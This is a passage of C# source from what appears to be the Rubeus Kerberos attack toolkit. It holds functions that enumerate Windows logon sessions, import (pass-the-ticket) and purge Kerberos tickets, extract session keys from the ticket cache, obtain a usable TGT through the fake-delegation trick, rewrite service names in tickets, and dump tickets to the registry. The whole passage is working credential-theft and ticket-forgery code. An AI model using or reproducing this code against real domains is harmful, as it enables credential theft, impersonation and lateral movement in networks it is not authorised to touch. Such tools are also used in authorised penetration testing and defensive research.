                    var userName = cred.enc_part.ticket_info[0].pname.name_string[0];
                    var domainName = cred.enc_part.ticket_info[0].prealm;
                    var startTime = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].starttime);
                    var endTime = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].endtime);
                    var renewTill = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].renew_till);
                    var flags = cred.enc_part.ticket_info[0].flags;
                    var base64TGT = Convert.ToBase64String(cred.Encode().Encode());

                    var userData = basePath.CreateSubKey(userName + "@" + domainName);

                    userData.SetValue("Username", domainName + "\\" + userName);
                    userData.SetValue("StartTime", startTime);
                    userData.SetValue("EndTime", endTime);
                    userData.SetValue("RenewTill", renewTill);
                    userData.SetValue("Flags", flags);
                    userData.SetValue("Base64EncodedTicket", base64TGT);
                }
                Console.WriteLine("\r\n[*] Wrote {0} tickets to HKLM:\\{1}.", creds.Count, baseRegistryKey);
            }
        }

        #endregion


        #region LogonSessions

        public static List<LUID> EnumerateLogonSessions()
        {
            var luids = new List<LUID>();

            if (!Helpers.IsHighIntegrity())
            {
                luids.Add(Helpers.GetCurrentLUID());
            }

            else
            {
                var ret = Interop.LsaEnumerateLogonSessions(out var count, out var luidPtr);

                if (ret != 0)
                {
                    throw new Win32Exception(ret);
                }

                for (ulong i = 0; i < count; i++)
                {
                    var luid = (LUID)Marshal.PtrToStructure(luidPtr, typeof(LUID));
                    luids.Add(luid);
                    luidPtr = (IntPtr)(luidPtr.ToInt64() + Marshal.SizeOf(typeof(LUID)));
                }
                Interop.LsaFreeReturnBuffer(luidPtr);
            }

            return luids;
        }

        public class LogonSessionData
        {
            public LUID LogonID;
            public string Username;
            public string LogonDomain;
            public string AuthenticationPackage;
            public Interop.LogonType LogonType;
            public int Session;
            public SecurityIdentifier Sid;
            public DateTime LogonTime;
            public string LogonServer;
            public string DnsDomainName;
            public string Upn;
        }

        public static LogonSessionData GetLogonSessionData(LUID luid)
        {
            var luidPtr = IntPtr.Zero;
            var sessionDataPtr = IntPtr.Zero;

            try
            {
                luidPtr = Marshal.AllocHGlobal(Marshal.SizeOf(luid));
                Marshal.StructureToPtr(luid, luidPtr, false);

                var ret = Interop.LsaGetLogonSessionData(luidPtr, out sessionDataPtr);
                if (ret != 0)
                {
                    throw new Win32Exception((int)ret);
                }

                var unsafeData =
                    (Interop.SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(sessionDataPtr,
                        typeof(Interop.SECURITY_LOGON_SESSION_DATA));

                return new LogonSessionData()
                {
                    AuthenticationPackage = Marshal.PtrToStringUni(unsafeData.AuthenticationPackage.Buffer, unsafeData.AuthenticationPackage.Length / 2),
                    DnsDomainName = Marshal.PtrToStringUni(unsafeData.DnsDomainName.Buffer, unsafeData.DnsDomainName.Length / 2),
                    LogonDomain = Marshal.PtrToStringUni(unsafeData.LoginDomain.Buffer, unsafeData.LoginDomain.Length / 2),
                    LogonID = unsafeData.LoginID,
                    LogonTime = DateTime.FromFileTime((long)unsafeData.LoginTime),
                    LogonServer = Marshal.PtrToStringUni(unsafeData.LogonServer.Buffer, unsafeData.LogonServer.Length / 2),
                    LogonType = (Interop.LogonType)unsafeData.LogonType,
                    Sid = (unsafeData.PSiD == IntPtr.Zero ? null : new SecurityIdentifier(unsafeData.PSiD)),
                    Upn = Marshal.PtrToStringUni(unsafeData.Upn.Buffer, unsafeData.Upn.Length / 2),
                    Session = (int)unsafeData.Session,
                    Username = Marshal.PtrToStringUni(unsafeData.Username.Buffer, unsafeData.Username.Length / 2),
                };
            }
            finally
            {
                if (sessionDataPtr != IntPtr.Zero)
                    Interop.LsaFreeReturnBuffer(sessionDataPtr);

                if (luidPtr != IntPtr.Zero)
                    Marshal.FreeHGlobal(luidPtr);
            }
        }

        #endregion


        #region Import and Export

        public static void ImportTicket(byte[] ticket, LUID targetLuid)
        {
            var lsaHandle = GetLsaHandle();
            int AuthenticationPackage;
            int ntstatus, ProtocalStatus;

            if ((ulong)targetLuid != 0)
            {
                if (!Helpers.IsHighIntegrity())
                {
                    Console.WriteLine("[X] You need to be in high integrity to apply a ticket to a different logon session");
                    return;
                }
            }

            var inputBuffer = IntPtr.Zero;
            IntPtr ProtocolReturnBuffer;
            int ReturnBufferLength;
            try
            {
                Interop.LSA_STRING_IN LSAString;
                var Name = "kerberos";
                LSAString.Length = (ushort)Name.Length;
                LSAString.MaximumLength = (ushort)(Name.Length + 1);
                LSAString.Buffer = Name;
                ntstatus = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out AuthenticationPackage);
                if (ntstatus != 0)
                {
                    var winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                    var errorMessage = new Win32Exception((int)winError).Message;
                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
                    return;
                }
                var request = new Interop.KERB_SUBMIT_TKT_REQUEST();
                request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbSubmitTicketMessage;
                request.KerbCredSize = ticket.Length;
                request.KerbCredOffset = Marshal.SizeOf(typeof(Interop.KERB_SUBMIT_TKT_REQUEST));

                if ((ulong)targetLuid != 0)
                {
                    Console.WriteLine("[*] Target LUID: 0x{0:x}", (ulong)targetLuid);
                    request.LogonId = targetLuid;
                }

                var inputBufferSize = Marshal.SizeOf(typeof(Interop.KERB_SUBMIT_TKT_REQUEST)) + ticket.Length;
                inputBuffer = Marshal.AllocHGlobal(inputBufferSize);
                Marshal.StructureToPtr(request, inputBuffer, false);
                Marshal.Copy(ticket, 0, new IntPtr(inputBuffer.ToInt64() + request.KerbCredOffset), ticket.Length);
                ntstatus = Interop.LsaCallAuthenticationPackage(lsaHandle, AuthenticationPackage, inputBuffer, inputBufferSize, out ProtocolReturnBuffer, out ReturnBufferLength, out ProtocalStatus);
                if (ntstatus != 0)
                {
                    var winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                    var errorMessage = new Win32Exception((int)winError).Message;
                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
                    return;
                }
                if (ProtocalStatus != 0)
                {
                    var winError = Interop.LsaNtStatusToWinError((uint)ProtocalStatus);
                    var errorMessage = new Win32Exception((int)winError).Message;
                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage (ProtocalStatus): {1}", winError, errorMessage);
                    return;
                }
                Console.WriteLine("[+] Ticket successfully imported!");
            }
            finally
            {
                if (inputBuffer != IntPtr.Zero)
                    Marshal.FreeHGlobal(inputBuffer);

                Interop.LsaDeregisterLogonProcess(lsaHandle);
            }
        }

        public static void Purge(LUID targetLuid)
        {
            var lsaHandle = GetLsaHandle();
            int AuthenticationPackage;
            int ntstatus, ProtocalStatus;

            if ((ulong)targetLuid != 0)
            {
                if (!Helpers.IsHighIntegrity())
                {
                    Console.WriteLine("[X] You need to be in high integrity to purge tickets from a different logon session");
                    return;
                }
            }

            var inputBuffer = IntPtr.Zero;
            IntPtr ProtocolReturnBuffer;
            int ReturnBufferLength;
            try
            {
                Interop.LSA_STRING_IN LSAString;
                var Name = "kerberos";
                LSAString.Length = (ushort)Name.Length;
                LSAString.MaximumLength = (ushort)(Name.Length + 1);
                LSAString.Buffer = Name;
                ntstatus = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out AuthenticationPackage);
                if (ntstatus != 0)
                {
                    var winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                    var errorMessage = new Win32Exception((int)winError).Message;
                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
                    return;
                }

                var request = new Interop.KERB_PURGE_TKT_CACHE_REQUEST();
                request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbPurgeTicketCacheMessage;

                if ((ulong)targetLuid != 0)
                {
                    Console.WriteLine("[*] Target LUID: 0x{0:x}", (ulong)targetLuid);
                    request.LogonId = targetLuid;
                }

                var inputBufferSize = Marshal.SizeOf(typeof(Interop.KERB_PURGE_TKT_CACHE_REQUEST));
                inputBuffer = Marshal.AllocHGlobal(inputBufferSize);
                Marshal.StructureToPtr(request, inputBuffer, false);
                ntstatus = Interop.LsaCallAuthenticationPackage(lsaHandle, AuthenticationPackage, inputBuffer, inputBufferSize, out ProtocolReturnBuffer, out ReturnBufferLength, out ProtocalStatus);
                if (ntstatus != 0)
                {
                    var winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                    var errorMessage = new Win32Exception((int)winError).Message;
                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
                    return;
                }
                if (ProtocalStatus != 0)
                {
                    var winError = Interop.LsaNtStatusToWinError((uint)ProtocalStatus);
                    var errorMessage = new Win32Exception((int)winError).Message;
                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage (ProtocolStatus): {1}", winError, errorMessage);
                    return;
                }
                Console.WriteLine("[+] Tickets successfully purged!");
            }
            finally
            {
                if (inputBuffer != IntPtr.Zero)
                    Marshal.FreeHGlobal(inputBuffer);

                Interop.LsaDeregisterLogonProcess(lsaHandle);
            }
        }

        #endregion


        #region Misc Helpers

        public static byte[] GetEncryptionKeyFromCache(string target, Interop.KERB_ETYPE etype)
        {
            int authPack;
            IntPtr lsaHandle;
            int retCode;
            var name = "kerberos";
            byte[] returnedSessionKey;
            Interop.LSA_STRING_IN LSAString;
            LSAString.Length = (ushort)name.Length;
            LSAString.MaximumLength = (ushort)(name.Length + 1);
            LSAString.Buffer = name;

            retCode = Interop.LsaConnectUntrusted(out lsaHandle);
            retCode = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPack);

            var returnBufferLength = 0;
            var protocalStatus = 0;
            var responsePointer = IntPtr.Zero;
            var request = new Interop.KERB_RETRIEVE_TKT_REQUEST();
            var response = new Interop.KERB_RETRIEVE_TKT_RESPONSE();

            request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveEncodedTicketMessage;
            request.CacheOptions = (uint)Interop.KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_USE_CACHE_ONLY;
            request.EncryptionType = (int)etype;

            var tName = new Interop.UNICODE_STRING(target);
            request.TargetName = tName;

            var structSize = Marshal.SizeOf(typeof(Interop.KERB_RETRIEVE_TKT_REQUEST));
            var newStructSize = structSize + tName.MaximumLength;
            var unmanagedAddr = Marshal.AllocHGlobal(newStructSize);

            Marshal.StructureToPtr(request, unmanagedAddr, false);

            var newTargetNameBuffPtr = (IntPtr)((long)(unmanagedAddr.ToInt64() + (long)structSize));

            Interop.CopyMemory(newTargetNameBuffPtr, tName.buffer, tName.MaximumLength);

            Marshal.WriteIntPtr(unmanagedAddr, IntPtr.Size == 8 ? 24 : 16, newTargetNameBuffPtr);

            retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, unmanagedAddr, newStructSize, out responsePointer, out returnBufferLength, out protocalStatus);

            var winError = Interop.LsaNtStatusToWinError((uint)protocalStatus);

            if ((retCode == 0) && ((uint)winError == 0) && (returnBufferLength != 0))
            {
                response = (Interop.KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure((System.IntPtr)responsePointer, typeof(Interop.KERB_RETRIEVE_TKT_RESPONSE));

                var sessionKeyType = (Interop.KERB_ETYPE)response.Ticket.SessionKey.KeyType;
                var sessionKeyLength = response.Ticket.SessionKey.Length;
                var sessionKey = new byte[sessionKeyLength];
                Marshal.Copy(response.Ticket.SessionKey.Value, sessionKey, 0, sessionKeyLength);

                returnedSessionKey = sessionKey;
            }
            else
            {
                var errorMessage = new Win32Exception((int)winError).Message;
                Console.WriteLine("\r\n[X] Error {0} calling LsaCallAuthenticationPackage() for target \"{1}\" : {2}", winError, target, errorMessage);
                returnedSessionKey = null;
            }

            Interop.LsaFreeReturnBuffer(responsePointer);
            Marshal.FreeHGlobal(unmanagedAddr);

            Interop.LsaDeregisterLogonProcess(lsaHandle);

            return returnedSessionKey;
        }

        public static byte[] RequestFakeDelegTicket(string targetSPN = "", bool display = true)
        {
            byte[] finalTGTBytes = null;

            if (String.IsNullOrEmpty(targetSPN))
            {
                if (display)
                {
                    Console.WriteLine("[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'");
                }
                var domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;
                var domainController = Networking.GetDCName(domain);
                if (String.IsNullOrEmpty(domainController))
                {
                    Console.WriteLine("[X] Error retrieving current domain controller");
                    return null;
                }
                targetSPN = String.Format("cifs/{0}", domainController);
            }

            var phCredential = new Interop.SECURITY_HANDLE();
            var ptsExpiry = new Interop.SECURITY_INTEGER();
            var SECPKG_CRED_OUTBOUND = 2;

            var status = Interop.AcquireCredentialsHandle(null, "Kerberos", SECPKG_CRED_OUTBOUND, IntPtr.Zero, IntPtr.Zero, 0, IntPtr.Zero, ref phCredential, ref ptsExpiry);

            if (status == 0)
            {
                var ClientToken = new Interop.SecBufferDesc(12288);
                var ClientContext = new Interop.SECURITY_HANDLE(0);
                uint ClientContextAttributes = 0;
                var ClientLifeTime = new Interop.SECURITY_INTEGER(0);
                var SECURITY_NATIVE_DREP = 0x00000010;
                var SEC_E_OK = 0x00000000;
                var SEC_I_CONTINUE_NEEDED = 0x00090312;

                if (display)
                {
                    Console.WriteLine("[*] Initializing Kerberos GSS-API w/ fake delegation for target '{0}'", targetSPN);
                }

                var status2 = Interop.InitializeSecurityContext(ref phCredential,
                            IntPtr.Zero,
                            targetSPN,    
                            (int)(Interop.ISC_REQ.ALLOCATE_MEMORY | Interop.ISC_REQ.DELEGATE | Interop.ISC_REQ.MUTUAL_AUTH),
                            0,  
                            SECURITY_NATIVE_DREP,  
                            IntPtr.Zero,        
                            0,  
                            out ClientContext,    
                            out ClientToken,    
                            out ClientContextAttributes,   
                            out ClientLifeTime);     

                if ((status2 == SEC_E_OK) || (status2 == SEC_I_CONTINUE_NEEDED))
                {
                    if (display)
                    {
                        Console.WriteLine("[+] Kerberos GSS-API initialization success!");
                    }

                    if ((ClientContextAttributes & (uint)Interop.ISC_REQ.DELEGATE) == 1)
                    {
                        if (display)
                        {
                            Console.WriteLine("[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.");
                        }

                        byte[] KeberosV5 = { 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x01, 0x02, 0x02 };  
                        var ClientTokenArray = ClientToken.GetSecBufferByteArray();
                        var index = Helpers.SearchBytePattern(KeberosV5, ClientTokenArray);
                        if (index > 0)
                        {
                            var startIndex = index += KeberosV5.Length;

                            if ((ClientTokenArray[startIndex] == 1) && (ClientTokenArray[startIndex + 1] == 0))
                            {
                                if (display)
                                {
                                    Console.WriteLine("[*] Found the AP-REQ delegation ticket in the GSS-API output.");
                                }

                                startIndex += 2;
                                var apReqArray = new byte[ClientTokenArray.Length - startIndex];
                                Buffer.BlockCopy(ClientTokenArray, startIndex, apReqArray, 0, apReqArray.Length);

                                var asn_AP_REQ = AsnElt.Decode(apReqArray, false);

                                foreach (var elt in asn_AP_REQ.Sub[0].Sub)
                                {
                                    if (elt.TagValue == 4)
                                    {
                                        var encAuthenticator = new EncryptedData(elt.Sub[0]);
                                        var authenticatorEtype = (Interop.KERB_ETYPE)encAuthenticator.etype;
                                        if (display)
                                        {
                                            Console.WriteLine("[*] Authenticator etype: {0}", authenticatorEtype);
                                        }

                                        var key = GetEncryptionKeyFromCache(targetSPN, authenticatorEtype);

                                        if (key != null)
                                        {
                                            var base64SessionKey = Convert.ToBase64String(key);
                                            if (display)
                                            {
                                                Console.WriteLine("[*] Extracted the service ticket session key from the ticket cache: {0}", base64SessionKey);
                                            }

                                            var rawBytes = Crypto.KerberosDecrypt(authenticatorEtype, Interop.KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR, key, encAuthenticator.cipher);

                                            var asnAuthenticator = AsnElt.Decode(rawBytes, false);

                                            foreach (var elt2 in asnAuthenticator.Sub[0].Sub)
                                            {
                                                if (elt2.TagValue == 3)
                                                {
                                                    if (display)
                                                    {
                                                        Console.WriteLine("[+] Successfully decrypted the authenticator");
                                                    }

                                                    var cksumtype = Convert.ToInt32(elt2.Sub[0].Sub[0].Sub[0].GetInteger());

                                                    if (cksumtype == 0x8003)
                                                    {
                                                        var checksumBytes = elt2.Sub[0].Sub[1].Sub[0].GetOctetString();

                                                        if ((checksumBytes[20] & 1) == 1)
                                                        {
                                                            var dLen = BitConverter.ToUInt16(checksumBytes, 26);
                                                            var krbCredBytes = new byte[dLen];
                                                            Buffer.BlockCopy(checksumBytes, 28, krbCredBytes, 0, dLen);

                                                            var asn_KRB_CRED = AsnElt.Decode(krbCredBytes, false);
                                                            Ticket ticket = null;
                                                            var cred = new KRB_CRED();

                                                            foreach (var elt3 in asn_KRB_CRED.Sub[0].Sub)
                                                            {
                                                                if (elt3.TagValue == 2)
                                                                {
                                                                    ticket = new Ticket(elt3.Sub[0].Sub[0].Sub[0]);
                                                                    cred.tickets.Add(ticket);
                                                                }
                                                                else if (elt3.TagValue == 3)
                                                                {
                                                                    var enc_part = elt3.Sub[0].Sub[1].GetOctetString();

                                                                    var rawBytes2 = Crypto.KerberosDecrypt(authenticatorEtype, Interop.KRB_KEY_USAGE_KRB_CRED_ENCRYPTED_PART, key, enc_part);

                                                                    var encKrbCredPartAsn = AsnElt.Decode(rawBytes2, false);
                                                                    cred.enc_part.ticket_info.Add(new KrbCredInfo(encKrbCredPartAsn.Sub[0].Sub[0].Sub[0].Sub[0]));
                                                                }
                                                            }

                                                            var kirbiBytes = cred.Encode().Encode();
                                                            var kirbiString = Convert.ToBase64String(kirbiBytes);

                                                            if (display)
                                                            {
                                                                Console.WriteLine("[*] base64(ticket.kirbi):\r\n", kirbiString);

                                                                if (Program.wrapTickets)
                                                                {
                                                                    foreach (var line in Helpers.Split(kirbiString, 80))
                                                                    {
                                                                        Console.WriteLine("      {0}", line);
                                                                    }
                                                                }
                                                                else
                                                                {
                                                                    Console.WriteLine("      {0}", kirbiString);
                                                                }
                                                            }

                                                            finalTGTBytes = kirbiBytes;
                                                        }
                                                    }
                                                    else
                                                    {
                                                        Console.WriteLine("[X] Error: Invalid checksum type: {0}", cksumtype);
                                                    }
                                                }
                                            }
                                        }
                                        else
                                        {
                                            Console.WriteLine("[X] Error: Unable to extract session key from cache for target SPN: {0}", targetSPN);
                                        }
                                    }
                                }
                            }
                            else
                            {
                                Console.WriteLine("[X] Error: Kerberos OID not found in output buffer!");
                            }
                        }
                        else
                        {
                            Console.WriteLine("[X] Error: Kerberos OID not found in output buffer!");
                        }
                    }
                    else
                    {
                        Console.WriteLine("[X] Error: Client is not allowed to delegate to target: {0}", targetSPN);
                    }
                }
                else
                {
                    Console.WriteLine("[X] Error: InitializeSecurityContext error: {0}", status2);
                }
                Interop.DeleteSecurityContext(ref ClientContext);
            }
            else
            {
                Console.WriteLine("[X] Error: AcquireCredentialsHandle error: {0}", status);
            }

            Interop.FreeCredentialsHandle(ref phCredential);
            return finalTGTBytes;
        }

        public static void SubstituteTGSSname(KRB_CRED kirbi, string altsname, bool ptt = false, LUID luid = new LUID(), string srealm = "")
        {
            Console.WriteLine("[*] Substituting in alternate service name: {0}", altsname);

            var name_string = new List<string>();
            var parts = altsname.Split('/');
            if (parts.Length == 1)
            {
                name_string.Add(altsname);
                kirbi.tickets[0].sname.name_string = name_string;   
                kirbi.enc_part.ticket_info[0].sname.name_string = name_string;     
            }
            else if (parts.Length > 1)
            {
                foreach (var part in parts)
                {
                    name_string.Add(part);
                }

                kirbi.tickets[0].sname.name_string = name_string;   
                kirbi.enc_part.ticket_info[0].sname.name_string = name_string;     
            }

            if (!string.IsNullOrWhiteSpace(srealm))
            {
                Console.WriteLine("[*] Substituting in alternate service realm: {0}", srealm);
                kirbi.tickets[0].realm = srealm.ToUpper();
                kirbi.enc_part.ticket_info[0].srealm = srealm.ToUpper();
            }

            var kirbiBytes = kirbi.Encode().Encode();

            LSA.DisplayTicket(kirbi, 2, false, true);

            if (ptt || ((ulong)luid != 0))
            {
                LSA.ImportTicket(kirbiBytes, luid);
            }
        }

        #endregion
    }
}
